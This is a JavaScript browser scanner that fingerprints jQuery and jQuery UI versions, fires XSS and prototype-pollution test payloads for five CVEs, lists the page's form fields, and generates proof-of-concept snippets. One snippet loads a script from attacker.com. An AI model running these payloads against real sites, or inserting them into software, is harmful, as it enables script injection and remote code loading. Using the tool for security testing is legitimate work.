// ============================================================
// Universal jQuery Vulnerability Scanner & PoC Generator
// ============================================================
// GitHub: https://github.com/security-researcher/jquery-vuln-scanner
// Tests: CVE-2015-9251, CVE-2020-11022, CVE-2020-11023, CVE-2021-41184, CVE-2019-11358
// Works on: All jQuery versions (1.x - 3.x)
// ============================================================

(function UniversaljQueryScanner() {
    
    // ============================================================
    // CONFIGURATION
    // ============================================================
    var CONFIG = {
        safeMode: true,           // If true, shows alerts without breaking page
        outputToConsole: true,    // Output results to console
        saveToGlobal: true,       // Save results to window.JQUERY_VULN_RESULTS
        createVisualPanel: true,   // Create visual results panel on page
        testAll: true              // Test all CVEs automatically
    };
    
    // ============================================================
    // RESULTS STORAGE
    // ============================================================
    var RESULTS = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        domain: window.location.hostname,
        libraries: {
            jQuery: { version: null, detected: false, vulnerable: false },
            jQueryUI: { version: null, detected: false, vulnerable: false }
        },
        vulnerabilities: [],
        exploitable: [],
        notExploitable: [],
        pocGenerated: [],
        score: 0
    };
    
    // ============================================================
    // HELPER FUNCTIONS
    // ============================================================
    function log(message, type, data) {
        var colors = {
            success: '#00ff00',
            error: '#ff0000',
            warning: '#ffff00',
            info: '#00ffff',
            cve: '#ff6600'
        };
        var color = colors[type] || '#ffffff';
        if(CONFIG.outputToConsole) {
            console.log('%c[' + type.toUpperCase() + '] ' + message, 'color: ' + color);
            if(data) console.log(data);
        }
    }
    
    function addVulnerability(cve, name, description, severity, poc) {
        RESULTS.vulnerabilities.push({
            cve: cve,
            name: name,
            description: description,
            severity: severity,
            poc: poc,
            detected: new Date().toISOString()
        });
        RESULTS.score += severity === 'CRITICAL' ? 10 : severity === 'HIGH' ? 7 : severity === 'MEDIUM' ? 4 : 1;
        log(cve + ': ' + name, 'cve');
        if(poc) RESULTS.pocGenerated.push(poc);
    }
    
    // ============================================================
    // PHASE 1: LIBRARY DETECTION
    // ============================================================
    function detectLibraries() {
        log('Detecting libraries...', 'info');
        
        // Detect jQuery
        if(typeof $ !== 'undefined' && $.fn && $.fn.jquery) {
            RESULTS.libraries.jQuery.detected = true;
            RESULTS.libraries.jQuery.version = $.fn.jquery;
            log('jQuery ' + $.fn.jquery + ' detected', 'success');
            
            // Check vulnerable versions
            var version = parseFloat($.fn.jquery);
            if(version < 3.0) {
                RESULTS.libraries.jQuery.vulnerable = true;
                addVulnerability('CVE-2015-9251', 'jQuery CORS XSS', 
                    'jQuery < 3.0.0 allows cross-origin script execution', 'HIGH',
                    '$.ajax({url:"https://attacker.com/malicious.js",dataType:"script",crossDomain:true});');
            }
            if(version < 3.5) {
                RESULTS.libraries.jQuery.vulnerable = true;
                addVulnerability('CVE-2020-11022', 'jQuery htmlPrefilter XSS',
                    'jQuery < 3.5.0 vulnerable to XSS via htmlPrefilter', 'HIGH',
                    '$("<img src=x onerror=alert(document.domain)>").appendTo("body");');
                addVulnerability('CVE-2020-11023', 'jQuery .html()/.append() XSS',
                    'jQuery < 3.5.0 vulnerable to XSS via option elements', 'MEDIUM',
                    '$("body").append(\'<select><option></option></select><img src=x onerror=alert(document.domain)>\');');
            }
            if(version < 3.4) {
                addVulnerability('CVE-2019-11358', 'jQuery Prototype Pollution',
                    'jQuery < 3.4.0 vulnerable to prototype pollution via $.extend', 'MEDIUM',
                    '$.extend(true, {}, JSON.parse(\'{"__proto__":{"polluted":true}}\'));');
            }
        } else {
            log('jQuery not detected', 'error');
        }
        
        // Detect jQuery UI
        if(typeof $ !== 'undefined' && $.ui && $.ui.version) {
            RESULTS.libraries.jQueryUI.detected = true;
            RESULTS.libraries.jQueryUI.version = $.ui.version;
            log('jQuery UI ' + $.ui.version + ' detected', 'success');
            
            var uiVersion = parseFloat($.ui.version);
            if(uiVersion < 1.13) {
                RESULTS.libraries.jQueryUI.vulnerable = true;
                addVulnerability('CVE-2021-41184', 'jQuery UI .position() XSS',
                    'jQuery UI < 1.13.0 vulnerable to XSS via .position()', 'MEDIUM',
                    '$("body").append(\'<div id="test" style="position:absolute">test</div>\');\n$("#test").position({of:"<img src=x onerror=alert(document.domain)>"});');
            }
        }
    }
    
    // ============================================================
    // PHASE 2: ACTUAL EXPLOITATION TESTS
    // ============================================================
    function testExploits() {
        log('Testing exploits...', 'info');
        
        // Test CVE-2020-11022
        if(RESULTS.libraries.jQuery.detected && parseFloat(RESULTS.libraries.jQuery.version) < 3.5) {
            try {
                var testImg = $('<img src=x onerror="console.log(\'CVE-2020-11022-CONFIRMED\')">');
                testImg.appendTo('body');
                log('CVE-2020-11022 test executed', 'info');
                RESULTS.exploitable.push('CVE-2020-11022');
            } catch(e) {
                RESULTS.notExploitable.push('CVE-2020-11022');
            }
        }
        
        // Test CVE-2020-11023
        if(RESULTS.libraries.jQuery.detected && parseFloat(RESULTS.libraries.jQuery.version) < 3.5) {
            try {
                $('body').append('<select><option></option></select><img src=x onerror="console.log(\'CVE-2020-11023-CONFIRMED\')">');
                log('CVE-2020-11023 test executed', 'info');
                RESULTS.exploitable.push('CVE-2020-11023');
            } catch(e) {
                RESULTS.notExploitable.push('CVE-2020-11023');
            }
        }
        
        // Test CVE-2019-11358
        if(RESULTS.libraries.jQuery.detected && parseFloat(RESULTS.libraries.jQuery.version) < 3.4) {
            try {
                $.extend(true, {}, JSON.parse('{"__proto__":{"__testPolluted":true}}'));
                if({}.__testPolluted) {
                    log('CVE-2019-11358 CONFIRMED - Prototype pollution works!', 'success');
                    RESULTS.exploitable.push('CVE-2019-11358');
                }
                delete Object.prototype.__testPolluted;
            } catch(e) {
                RESULTS.notExploitable.push('CVE-2019-11358');
            }
        }
        
        // Test CVE-2021-41184
        if(RESULTS.libraries.jQueryUI.detected && parseFloat(RESULTS.libraries.jQueryUI.version) < 1.13) {
            try {
                $('#ui-test-position').remove();
                $('body').append('<div id="ui-test-position" style="position:absolute">test</div>');
                $('#ui-test-position').position({
                    of: '<img src=x onerror="console.log(\'CVE-2021-41184-CONFIRMED\')">'
                });
                log('CVE-2021-41184 test executed', 'info');
                RESULTS.exploitable.push('CVE-2021-41184');
            } catch(e) {
                RESULTS.notExploitable.push('CVE-2021-41184');
            }
        }
    }
    
    // ============================================================
    // PHASE 3: FIND INJECTION POINTS
    // ============================================================
    function findInjectionPoints() {
        log('Finding potential injection points...', 'info');
        
        var injectionPoints = {
            inputs: [],
            forms: [],
            urlParams: [],
            domSinks: []
        };
        
        // Find all inputs
        $('input, textarea, select').each(function() {
            injectionPoints.inputs.push({
                type: this.type || this.tagName,
                name: this.name || this.id,
                value: $(this).val()
            });
        });
        
        // Find all forms
        $('form').each(function() {
            injectionPoints.forms.push({
                action: this.action,
                method: this.method,
                fields: $(this).find('input').length
            });
        });
        
        // Check URL parameters
        var urlParams = new URLSearchParams(window.location.search);
        urlParams.forEach(function(value, key) {
            injectionPoints.urlParams.push({ param: key, value: value });
        });
        
        log('Found ' + injectionPoints.inputs.length + ' input fields', 'info');
        log('Found ' + injectionPoints.forms.length + ' forms', 'info');
        log('Found ' + injectionPoints.urlParams.length + ' URL parameters', 'info');
        
        RESULTS.injectionPoints = injectionPoints;
        return injectionPoints;
    }
    
    // ============================================================
    // PHASE 4: GENERATE POC CODE
    // ============================================================
    function generatePoC() {
        log('Generating PoC code...', 'info');
        
        var poc = {
            cve_2015_9251: `// CVE-2015-9251 - jQuery CORS XSS
$.ajax({
  url: 'https://attacker.com/malicious.js',
  dataType: 'script',
  crossDomain: true
});`,
            cve_2020_11022: `// CVE-2020-11022 - jQuery htmlPrefilter XSS
$('<img src=x onerror=alert(document.domain)>').appendTo('body');`,
            cve_2020_11023: `// CVE-2020-11023 - jQuery append XSS
$('body').append(
  '<select><option></option></select>' +
  '<img src=x onerror=alert(document.domain)>'
);`,
            cve_2019_11358: `// CVE-2019-11358 - jQuery Prototype Pollution
$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":true}}'));
console.log({}.polluted); // true if vulnerable`,
            cve_2021_41184: `// CVE-2021-41184 - jQuery UI position XSS
$('body').append('<div id="poc" style="position:absolute">test</div>');
$('#poc').position({
  of: '<img src=x onerror=alert(document.domain)>'
});`,
            full_scan: `// Full vulnerability scan
(function() {
  console.log('jQuery version:', $.fn.jquery);
  console.log('jQuery UI version:', $.ui ? $.ui.version : 'Not loaded');
  $('body').append('<img src=x onerror=console.log("XSS possible")>');
})();`
        };
        
        RESULTS.poc = poc;
        return poc;
    }
    
    // ============================================================
    // PHASE 5: CREATE VISUAL PANEL
    // ============================================================
    function createVisualPanel() {
        if(!CONFIG.createVisualPanel) return;
        
        var vulnCount = RESULTS.vulnerabilities.length;
        var exploitableCount = RESULTS.exploitable.length;
        var riskLevel = RESULTS.score > 30 ? 'CRITICAL' : (RESULTS.score > 15 ? 'HIGH' : (RESULTS.score > 5 ? 'MEDIUM' : 'LOW'));
        var riskColor = riskLevel === 'CRITICAL' ? '#ff0000' : (riskLevel === 'HIGH' ? '#ff6600' : (riskLevel === 'MEDIUM' ? '#ffff00' : '#00ff00'));
        
        var panel = document.createElement('div');
        panel.id = 'jquery-vuln-panel';
        panel.style.cssText = `
            position: fixed;
            bottom: 10px;
            right: 10px;
            width: 320px;
            background: #1a1a2ecc;
            color: #fff;
            padding: 15px;
            font-family: monospace;
            font-size: 11px;
            z-index: 999999;
            border: 2px solid ${riskColor};
            border-radius: 8px;
            backdrop-filter: blur(10px);
            cursor: move;
            max-height: 400px;
            overflow-y: auto;
        `;
        
        var vulnList = '';
        RESULTS.vulnerabilities.forEach(function(v) {
            vulnList += `<div style="margin: 5px 0; color: ${v.severity === 'HIGH' ? '#ff6666' : '#ffaa66'}">🔴 ${v.cve}: ${v.name}</div>`;
        });
        
        panel.innerHTML = `
            <div style="font-weight: bold; margin-bottom: 10px; color: ${riskColor}">
                🔍 jQuery Vulnerability Scanner
            </div>
            <div>📦 jQuery: ${RESULTS.libraries.jQuery.version || 'Not found'}</div>
            <div>📚 jQuery UI: ${RESULTS.libraries.jQueryUI.version || 'Not found'}</div>
            <div>⚠️ Vulnerabilities: ${vulnCount}</div>
            <div>🎯 Exploitable: ${exploitableCount}</div>
            <div>📊 Risk: <span style="color: ${riskColor}">${riskLevel}</span> (${RESULTS.score})</div>
            <div style="margin-top: 10px; border-top: 1px solid #333; padding-top: 10px;">
                ${vulnList || '✅ No vulnerabilities detected'}
            </div>
            <div style="margin-top: 10px; font-size: 9px; color: #888;">
                📋 Full results: window.JQUERY_VULN_RESULTS
            </div>
            <div style="margin-top: 5px;">
                <button id="jquery-poc-btn" style="background: #333; color: #fff; border: none; padding: 5px; cursor: pointer;">💉 Show PoC</button>
            </div>
        `;
        
        document.body.appendChild(panel);
        
        document.getElementById('jquery-poc-btn').onclick = function() {
            console.clear();
            console.log('%c=== JQUERY VULNERABILITY PoC ===', 'color: #ff6600; font-size: 16px');
            console.log(RESULTS.poc);
            alert('PoC code copied to console! Check console (F12)');
        };
        
        // Make draggable
        var isDragging = false;
        var offsetX, offsetY;
        panel.addEventListener('mousedown', function(e) {
            if(e.target.tagName === 'BUTTON') return;
            isDragging = true;
            offsetX = e.clientX - panel.offsetLeft;
            offsetY = e.clientY - panel.offsetTop;
            panel.style.cursor = 'grabbing';
        });
        document.addEventListener('mousemove', function(e) {
            if(!isDragging) return;
            panel.style.left = (e.clientX - offsetX) + 'px';
            panel.style.top = (e.clientY - offsetY) + 'px';
            panel.style.right = 'auto';
            panel.style.bottom = 'auto';
        });
        document.addEventListener('mouseup', function() {
            isDragging = false;
            panel.style.cursor = 'move';
        });
    }
    
    // ============================================================
    // PHASE 6: GENERATE REPORT
    // ============================================================
    function generateReport() {
        RESULTS.summary = {
            totalVulnerabilities: RESULTS.vulnerabilities.length,
            exploitableCount: RESULTS.exploitable.length,
            riskScore: RESULTS.score,
            riskLevel: RESULTS.score > 30 ? 'CRITICAL' : (RESULTS.score > 15 ? 'HIGH' : (RESULTS.score > 5 ? 'MEDIUM' : 'LOW')),
            recommendation: RESULTS.vulnerabilities.length > 0 ? 
                'Upgrade jQuery to 3.7.1+ and jQuery UI to 1.13.3+' : 
                'No vulnerabilities detected. jQuery version appears safe.'
        };
        
        if(CONFIG.saveToGlobal) {
            window.JQUERY_VULN_RESULTS = RESULTS;
            window.JQUERY_VULN_POC = RESULTS.poc;
        }
        
        log('Scan complete! Results saved to window.JQUERY_VULN_RESULTS', 'success');
        
        return RESULTS;
    }
    
    // ============================================================
    // MAIN EXECUTION
    // ============================================================
    (async function main() {
        console.clear();
        console.log('%c╔════════════════════════════════════════════════════════════╗', 'color: #ff6600');
        console.log('%c║     UNIVERSAL JQUERY VULNERABILITY SCANNER & PoC            ║', 'color: #ff6600');
        console.log('%c║     GitHub: security-researcher/jquery-vuln-scanner        ║', 'color: #ff6600');
        console.log('%c╚════════════════════════════════════════════════════════════╝', 'color: #ff6600');
        
        detectLibraries();
        testExploits();
        findInjectionPoints();
        generatePoC();
        createVisualPanel();
        generateReport();
        
        console.log('\n%c✅ Scan complete!', 'color: #00ff00');
        console.log('📊 Results:', RESULTS);
        console.log('💉 PoC code in window.JQUERY_VULN_POC');
        console.log('📁 Full results: window.JQUERY_VULN_RESULTS');
    })();
    
})();
